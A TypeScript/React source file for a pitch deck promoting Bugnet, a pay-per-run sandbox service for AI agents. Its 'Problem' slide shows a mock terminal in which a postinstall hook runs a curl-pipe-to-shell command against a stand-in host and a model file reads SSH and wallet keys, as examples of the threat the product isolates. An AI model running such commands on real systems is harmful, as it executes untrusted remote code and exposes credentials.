import type { ReactElement } from "react";
import { cx } from "../../lib/cx";
import { catalogPackages } from "../../lib/landing/catalog";
import { AllowanceArt } from "../landing/art/pay-art";
import { OffMachineArt } from "../landing/art/safety-art";
import { SandboxFigure } from "../landing/figure/sandbox-figure";
import { ArchitectureDiagram, ArchitectureStack, PaymentDiagram, PaymentStack } from "./diagrams";
import { Slide, Split, solana, type } from "./slide";
import {
    bad,
    blank,
    call,
    m,
    money,
    more,
    ok,
    prompt,
    result,
    say,
    shell,
    t,
    Terminal,
} from "./terminal";

export const comparisonColumns = ["Bugnet", "Sandbox APIs", "Your computer"];

export const comparison: { row: string; cells: [string, string, string] }[] = [
    { row: "Sign-up", cells: ["None", "Account, API key", "None"] },
    { row: "Payment", cells: ["Per run, in USDC", "Card on file", "Your hardware"] },
    { row: "Setup", cells: ["One command", "SDK in your code", "Docker or VM"] },
    { row: "Started by", cells: ["Your agent, when it fits", "Your code", "You"] },
    { row: "Your files and keys", cells: ["Out of reach", "Out of reach", "At risk"] },
];

export const steps = [
    {
        head: "Ask",
        text: "You ask for a run. The agent calls bugnet_assess, a free check that says whether a sandbox fits and what it costs.",
    },
    {
        head: "Approve",
        text: "The agent names the size and the price. Your client asks you to approve that exact amount.",
    },
    {
        head: "Pay",
        text: "You pay in USDC on Solana, by link in Phantom or Solflare, or with Touch ID from a local wallet.",
    },
    {
        head: "Run",
        text: "The agent runs commands, reads files and opens previews. At the deadline the sandbox is deleted.",
    },
];

export const today: { head: string; text: string }[] = [
    {
        head: "84%",
        text: "of prompts where a sandbox fits, the agent offered Bugnet before running anything. Without Bugnet, 30% suggested any sandbox. 324 Claude Code runs.",
    },
    {
        head: "Mainnet",
        text: "Pay, start, run, preview, stop and refund work end to end with real USDC on our test stack.",
    },
    {
        head: "x402",
        text: "Code in a sandbox paid an x402 API on Solana mainnet on 8\u00a0November 2026.",
    },
    {
        head: "MCP",
        text: "Tested with Claude Code. Setup for Cursor, VS Code, Codex and Devin is documented.",
    },
];

export const founder: { value: string; label: string; accent?: boolean }[] = [
    { value: "7", label: "years of web" },
    { value: "3", label: "years of Web3" },
    { value: "10+", label: "blockchain hackathon wins", accent: true },
];

export const wins = ["EDU Chain Semester 3", "HackaTRON", "Sui Overflow 2025"];

export const roadmap: { step: string; text: string; stage: "now" | "next" | "last" }[] = [
    {
        step: "Today",
        text: "Sandbox time bought from cloud providers and sold per run.",
        stage: "now",
    },
    {
        step: "Our own servers",
        text: "Runs move from rented clouds onto machines we operate.",
        stage: "next",
    },
    { step: "GPU sandboxes", text: "Machines with GPUs for AI models.", stage: "next" },
    {
        step: "An open network",
        text: "Anyone can be a sandbox provider on their own machine and get paid per run. It is the hardest step, because untrusted code has to stay isolated on machines we don't control.",
        stage: "last",
    },
];

const usd = (micros: number) => `${(micros / 1e6).toFixed(2)}\u00a0USDC`;

/** The rendered mark, on the last slide */
function Mark() {
    return (
        <img
            src="/mark.png"
            alt=""
            width={986}
            height={1200}
            className="h-[34cqi] w-auto phone:h-auto phone:w-1/2"
        />
    );
}

function Comparison() {
    return (
        <>
            <table className="w-full table-fixed border-collapse text-left phone:hidden">
                <colgroup>
                    <col className="w-[22%]" />
                    <col className="w-[28%]" />
                    <col className="w-[25%]" />
                    <col className="w-[25%]" />
                </colgroup>
                <thead>
                    <tr className="border-b-(length:--hairline) border-line">
                        <th />
                        {comparisonColumns.map((c, i) => (
                            <th
                                key={c}
                                scope="col"
                                className={cx(
                                    "pb-[1.4cqi] text-[max(14px,1.45cqi)] font-semibold",
                                    i === 0 ? "text-accent" : "text-text-muted",
                                )}
                            >
                                {c}
                            </th>
                        ))}
                    </tr>
                </thead>
                <tbody>
                    {comparison.map(({ row, cells }) => (
                        <tr key={row} className="border-b-(length:--hairline) border-line">
                            <th
                                scope="row"
                                className="py-[1.4cqi] pr-[1.5cqi] text-[max(13px,1.25cqi)] font-normal text-text-muted"
                            >
                                {row}
                            </th>
                            {cells.map((cell, i) => (
                                <td
                                    key={comparisonColumns[i]}
                                    className={cx(
                                        "py-[1.4cqi] pr-[1.5cqi] text-[max(14px,1.45cqi)] leading-[1.35]",
                                        i === 0 ? "text-text" : "text-text-muted",
                                    )}
                                >
                                    {cell}
                                </td>
                            ))}
                        </tr>
                    ))}
                </tbody>
            </table>
            <div className="hidden flex-col gap-(--space-5) phone:flex">
                {comparisonColumns.map((c, i) => (
                    <div
                        key={c}
                        className="border-t-(length:--hairline) border-line pt-(--space-4)"
                    >
                        <p
                            className={cx(
                                "text-[17px] font-semibold",
                                i === 0 ? "text-accent" : "text-text-muted",
                            )}
                        >
                            {c}
                        </p>
                        <ul className="mt-(--space-2)">
                            {comparison.map(({ row, cells }) => (
                                <li
                                    key={row}
                                    className={cx(
                                        "text-[15px] leading-[1.6]",
                                        i === 0 ? "text-text" : "text-text-muted",
                                    )}
                                >
                                    {row}: {cells[i]}
                                </li>
                            ))}
                        </ul>
                    </div>
                ))}
            </div>
        </>
    );
}

function Steps() {
    return (
        <ol className="border-t-(length:--hairline) border-line">
            {steps.map((s, i) => (
                <li
                    key={s.head}
                    className="grid grid-cols-[max(28px,3.6cqi)_minmax(0,1fr)] gap-[1.6cqi] border-b-(length:--hairline) border-line py-[1.7cqi] phone:gap-(--space-3) phone:py-(--space-4)"
                >
                    <span className="font-head text-[max(22px,2.6cqi)] leading-none font-extralight text-accent">
                        {i + 1}
                    </span>
                    <span>
                        <span className="block text-[max(15px,1.5cqi)] leading-[1.3] font-semibold">
                            {s.head}
                        </span>
                        <span className={cx(type.text, "mt-[0.5cqi] block")}>{s.text}</span>
                    </span>
                </li>
            ))}
        </ol>
    );
}

function Prices() {
    return (
        <table className="w-full border-collapse text-left">
            <thead>
                <tr className="border-b-(length:--hairline) border-line text-[max(12px,1.15cqi)] text-text-muted">
                    {["vCPU", "Memory", "Disk", "Time", "Price"].map((h) => (
                        <th key={h} scope="col" className="pb-[1.2cqi] font-normal">
                            {h}
                        </th>
                    ))}
                </tr>
            </thead>
            <tbody>
                {catalogPackages().map((p) => (
                    <tr
                        key={p.id}
                        className="border-b-(length:--hairline) border-line text-[max(14px,1.45cqi)] tabular-nums"
                    >
                        <td className="py-[1.15cqi]">{p.vcpu}</td>
                        <td className="py-[1.15cqi]">{p.memoryMiB / 1024}&nbsp;GiB</td>
                        <td className="py-[1.15cqi]">{p.diskGiB}&nbsp;GiB</td>
                        <td className="py-[1.15cqi]">{p.minutes}&nbsp;min</td>
                        <td className="py-[1.15cqi] text-accent">{usd(p.priceMicros)}</td>
                    </tr>
                ))}
            </tbody>
        </table>
    );
}

function Facts() {
    return (
        <dl className="border-t-(length:--hairline) border-line">
            {today.map((f) => (
                <div
                    key={f.head}
                    className="grid grid-cols-[minmax(0,0.44fr)_minmax(0,1fr)] items-baseline gap-[2cqi] border-b-(length:--hairline) border-line py-[1.6cqi] phone:grid-cols-1 phone:gap-(--space-2) phone:py-(--space-4)"
                >
                    <dt className="font-head text-[max(24px,2.8cqi)] leading-none font-extralight">
                        {f.head}
                    </dt>
                    <dd className={type.text}>{f.text}</dd>
                </div>
            ))}
        </dl>
    );
}

/** The roadmap as one track, from today's rented clouds to the open network */
function Roadmap() {
    return (
        <ol>
            {roadmap.map((r, i) => (
                <li
                    key={r.step}
                    className="grid grid-cols-[max(14px,1.4cqi)_minmax(0,1fr)] gap-x-[1.8cqi] phone:gap-x-(--space-4)"
                >
                    <div
                        aria-hidden="true"
                        className="flex flex-col items-center pt-[0.55cqi] phone:pt-(--space-1)"
                    >
                        <span
                            className={cx(
                                "size-[max(10px,1cqi)] shrink-0 border-(length:--hairline)",
                                r.stage === "now" && "border-text bg-text",
                                r.stage === "next" && "border-text-muted",
                                r.stage === "last" && "border-accent bg-accent",
                            )}
                        />
                        {i < roadmap.length - 1 && (
                            <span className="mt-[0.5cqi] w-(--hairline) flex-1 bg-line phone:mt-(--space-1)" />
                        )}
                    </div>
                    <div className={cx(i < roadmap.length - 1 && "pb-[2cqi] phone:pb-(--space-5)")}>
                        <p
                            className={cx(
                                "font-head text-[max(20px,2.2cqi)] leading-[1.1] font-extralight",
                                r.stage === "last" && "text-accent",
                            )}
                        >
                            {r.step}
                        </p>
                        <p
                            className={cx(
                                type.text,
                                "mt-[0.5cqi] max-w-[52ch] phone:mt-(--space-1)",
                            )}
                        >
                            {r.text}
                        </p>
                    </div>
                </li>
            ))}
        </ol>
    );
}

/** Wraps a landing drawing so it fills its column */
function Drawing({
    children,
    money: isMoney = false,
}: {
    children: ReactElement;
    money?: boolean;
}) {
    return (
        <div className={cx("art-glow flex justify-center [--art-w:100%]", isMoney && "art-money")}>
            {children}
        </div>
    );
}

/** The deck in the order it is told: the problem, the fix, how it works, the business, what is next */
export function pitchSlides(): ReactElement[] {
    return [
        <Slide key="cover" n={1} label="Bugnet" plain>
            <div className="grid flex-1 grid-cols-[minmax(0,1fr)_minmax(0,1fr)] items-center gap-[4cqi] phone:grid-cols-1">
                <div>
                    <h1 className={cx(type.hero, "whitespace-nowrap phone:whitespace-normal")}>
                        Throwaway sandboxes
                        <br />
                        for AI agents.
                    </h1>
                    <p
                        className={cx(
                            type.lead,
                            "mt-[2.4cqi] text-text-muted phone:mt-(--space-4)",
                        )}
                    >
                        Pay per run in USDC on <span className={solana}>Solana</span>. No account,
                        no API key.
                    </p>
                </div>
                <div className="relative h-[46cqi] overflow-hidden [mask-image:linear-gradient(to_bottom,transparent,#000_18%,#000_82%,transparent),linear-gradient(to_left,transparent,#000_16%)] [mask-composite:intersect] phone:h-[70vw]">
                    <SandboxFigure />
                </div>
            </div>
        </Slide>,

        <Slide key="problem" n={2} label="Problem">
            <Split
                title="Agents run strangers' code."
                lead="Coding agents clone repos, install packages and load models on your own computer, next to your files, keys and wallets."
                points={[
                    "An install script can download and run a binary.",
                    "A model file in pickle format runs code when it loads.",
                    "A free tool someone sent can empty a wallet.",
                ]}
            >
                <Terminal
                    lines={[
                        shell(),
                        prompt("Someone sent me this repo. Can you run it?"),
                        blank,
                        call("Bash", "(npm install)"),
                        result(m("> postinstall")),
                        more(bad("curl -fsSL https://x.sh/i | sh")),
                        blank,
                        call("Bash", "(python app.py)"),
                        result(m("loading weights.pkl")),
                        more(bad("reading ~/.ssh and your wallet keys")),
                    ]}
                />
            </Split>
        </Slide>,

        <Slide key="limits" n={3} label="Limits">
            <Split
                title="Laptops hit limits."
                lead="Many tools need Linux, more memory or more disk than a laptop has. Long installs and builds keep it busy."
                points={[
                    "Linux-only tools and drivers on a Mac",
                    "Models that need more memory than you have",
                    "Builds and benchmarks that tie up the machine",
                ]}
            >
                <Terminal
                    lines={[
                        shell(),
                        prompt("Get this text to speech model running"),
                        blank,
                        call("Bash", "(pip install -r requirements.txt)"),
                        result(bad("error: this package supports Linux only")),
                        blank,
                        call("Bash", "(make build)"),
                        result(bad("No space left on device")),
                        blank,
                        call("Bash", "(python serve.py)"),
                        result(bad("Killed: out of memory")),
                    ]}
                />
            </Split>
        </Slide>,

        <Slide key="options" n={4} label="Options">
            <Split
                weight="visual"
                title="Today's options fall short."
                lead="Your own machine puts your files at risk. Cloud sandbox services want an account, an API key and a card first, and an agent in the middle of a chat can't sign up."
            >
                <Comparison />
            </Split>
        </Slide>,

        <Slide key="solution" n={5} label="Solution">
            <Split
                title="A sandbox, one call away."
                lead="Bugnet gives your agent a throwaway cloud sandbox, paid per run in USDC on Solana. When time is up, the sandbox and everything in it are deleted."
                points={[
                    "0.05\u00a0USDC for 10\u00a0minutes on 2\u00a0vCPU and 2\u00a0GiB",
                    "Ready 14 to 29\u00a0seconds after payment",
                    "Works in any MCP client, tested with Claude Code",
                ]}
            >
                <Terminal
                    lines={[
                        shell(),
                        prompt("Someone sent me a repo. Get it running?"),
                        blank,
                        call("bugnet_assess", "(repo)"),
                        result(m("fits   "), t("small-10m")),
                        more(m("price  "), money("0.05 USDC")),
                        say(
                            t("I can run it in a throwaway sandbox for "),
                            money("0.05 USDC"),
                            t("."),
                        ),
                        prompt("Yes"),
                        call("bugnet_start", "(small-10m, 0.05)"),
                        result(t("paid "), money("0.05 USDC"), t(" on Solana, ready")),
                        call("bugnet_preview", "(5173)"),
                        result(ok("https://...preview.bugnet.sh")),
                    ]}
                />
            </Split>
        </Slide>,

        <Slide key="how" n={6} label="How it works">
            <Split
                title="Four steps, one approval."
                lead="The agent does the work. You approve one exact price and pay once."
            >
                <Steps />
            </Split>
        </Slide>,

        <Slide key="inside" n={7} label="Architecture">
            <Split
                weight="visual"
                title="Plain code, no AI."
                lead="Your own agent does the thinking. Bugnet never sees the conversation, only the tool calls it is sent."
                points={[
                    "A Go router picks one of three cloud providers by cost and health",
                    "TypeScript gateway and payments, joined over Connect-RPC",
                ]}
            >
                <div className="phone:hidden">
                    <ArchitectureDiagram />
                </div>
                <div className="hidden phone:block">
                    <ArchitectureStack />
                </div>
            </Split>
        </Slide>,

        <Slide key="payments" n={8} label="Payments">
            <Split
                weight="visual"
                title={
                    <>
                        Paid with x402 on <span className={solana}>Solana</span>.
                    </>
                }
                lead="x402 is an open standard for paying on the web. Bugnet names the price, you pay, and the sandbox starts."
                points={[
                    "USDC on Solana mainnet, settled in seconds",
                    "Bugnet pays the network fees",
                    "A paid order that starts no sandbox is refunded to the wallet that paid",
                ]}
            >
                <div className="phone:hidden">
                    <PaymentDiagram />
                </div>
                <div className="hidden phone:block">
                    <PaymentStack />
                </div>
            </Split>
        </Slide>,

        <Slide key="safety" n={9} label="Safety">
            <Split
                title="Untrusted code stays in the sandbox."
                lead="The sandbox runs on a cloud machine. It can't reach your files, your keys or your local network, and at the deadline everything in it is deleted."
                points={[
                    "A free, rule-based check first: repo age, install scripts that fetch binaries, hidden code, model files that run code",
                    "Cloud metadata and private networks are blocked",
                    "Output comes back as data, with escape codes stripped",
                    "Bugnet refuses any price but the one you approved",
                ]}
            >
                <Drawing>
                    <OffMachineArt />
                </Drawing>
            </Split>
        </Slide>,

        <Slide key="apis" n={10} label="Paid APIs">
            <Split
                title="The sandbox pays for its APIs."
                lead="Code in the sandbox can call x402 APIs that charge per call. Bugnet pays them from an allowance you approve, so no wallet key or API key enters the sandbox."
                points={[
                    "No margin on API calls",
                    "At most 0.50\u00a0USDC a call and 5\u00a0USDC a sandbox",
                    "What is left goes back to your wallet",
                ]}
            >
                <Drawing money>
                    <AllowanceArt />
                </Drawing>
            </Split>
        </Slide>,

        <Slide key="fit" n={11} label="Who it is for">
            <Split
                title="Where it fits."
                lead="Any time an agent should not run something on your machine, or can't."
                points={[
                    "Developers whose agents run code nobody checked",
                    "Anyone trying open-source tools and models",
                    "Teams that keep untrusted code off work laptops",
                ]}
            >
                <Terminal
                    lines={[
                        shell(),
                        prompt("Try this repo someone sent me"),
                        blank,
                        prompt("Get this text to speech model running"),
                        blank,
                        prompt("Run this Linux-only tool from my Mac"),
                        blank,
                        prompt("Benchmark this build without slowing my laptop"),
                        blank,
                        prompt("Open this installer and tell me what it does"),
                    ]}
                />
            </Split>
        </Slide>,

        <Slide key="business" n={12} label="Business model">
            <Split
                title="Margin on every run."
                lead="Bugnet buys sandbox time from cloud providers and sells it per run. The router only places a run where compute costs at most half its price."
                points={[
                    "API calls at cost, plus 0.003\u00a0USDC once per sandbox that buys an allowance",
                    "USDC payments are final, with no card fees or chargebacks",
                ]}
            >
                <Prices />
            </Split>
        </Slide>,

        <Slide key="today" n={13} label="Today">
            <Split
                title="Working on mainnet today."
                lead="Every step runs end to end with real USDC on our test stack."
            >
                <Facts />
            </Split>
        </Slide>,

        <Slide key="team" n={14} label="Team">
            <div className="grid grid-cols-[minmax(0,0.62fr)_minmax(0,1.38fr)] items-center gap-[5cqi] phone:grid-cols-1 phone:gap-(--space-7)">
                <img
                    src="/pitch/ozan.jpg"
                    alt="Ozan Andaç"
                    width={900}
                    height={1163}
                    className="h-auto max-h-[46cqi] w-full object-cover phone:max-h-none"
                />
                <div>
                    <h2 className={type.title}>Ozan Andaç</h2>
                    <p className={cx(type.lead, "mt-[1cqi] text-text-muted phone:mt-(--space-2)")}>
                        Builder, Bugnet
                    </p>
                    <div className="mt-[3cqi] grid grid-cols-3 gap-[2.4cqi] phone:mt-(--space-6) phone:gap-(--space-4)">
                        {founder.map((f) => (
                            <div key={f.label}>
                                <p
                                    className={cx(
                                        "font-head text-[max(32px,4.6cqi)] leading-none font-extralight",
                                        f.accent && "text-accent",
                                    )}
                                >
                                    {f.value}
                                </p>
                                <p className={cx(type.text, "mt-[0.9cqi] phone:mt-(--space-2)")}>
                                    {f.label}
                                </p>
                            </div>
                        ))}
                    </div>
                    <p className={cx(type.text, "mt-[3cqi] phone:mt-(--space-6)")}>Wins include</p>
                    <ul className="mt-[1cqi] border-t-(length:--hairline) border-line phone:mt-(--space-2)">
                        {wins.map((w) => (
                            <li
                                key={w}
                                className="border-b-(length:--hairline) border-line py-[1.1cqi] text-[max(15px,1.6cqi)] leading-[1.3] phone:py-(--space-3)"
                            >
                                {w}
                            </li>
                        ))}
                    </ul>
                    <a
                        href="https://oynozan.com"
                        target="_blank"
                        rel="noreferrer"
                        className="mt-[2.2cqi] inline-block text-[max(15px,1.6cqi)] text-accent hover:underline phone:mt-(--space-4)"
                    >
                        oynozan.com
                    </a>
                </div>
            </div>
        </Slide>,

        <Slide key="roadmap" n={15} label="Roadmap">
            <Split
                title="From rented clouds to an open network."
                lead="The core works on mainnet. Next, runs move onto our own servers, and last onto machines anyone can offer."
            >
                <Roadmap />
            </Split>
        </Slide>,

        <Slide key="close" n={16} label="Contact" plain>
            <div className="grid flex-1 grid-cols-[minmax(0,1fr)_auto] items-center gap-[4cqi] phone:grid-cols-1">
                <div>
                    <p className={type.hero}>Bugnet</p>
                    <p
                        className={cx(
                            type.lead,
                            "mt-[1.6cqi] text-text-muted phone:mt-(--space-3)",
                        )}
                    >
                        Throwaway sandboxes for AI agents.
                    </p>
                    <div className="mt-[4cqi] flex flex-col gap-[0.8cqi] text-[max(16px,2cqi)] leading-[1.4] phone:mt-(--space-7) phone:gap-(--space-2)">
                        <span>bugnet.sh</span>
                        <a href="mailto:support@bugnet.org" className="text-accent hover:underline">
                            support@bugnet.org
                        </a>
                    </div>
                </div>
                <Mark />
            </div>
        </Slide>,
    ];
}
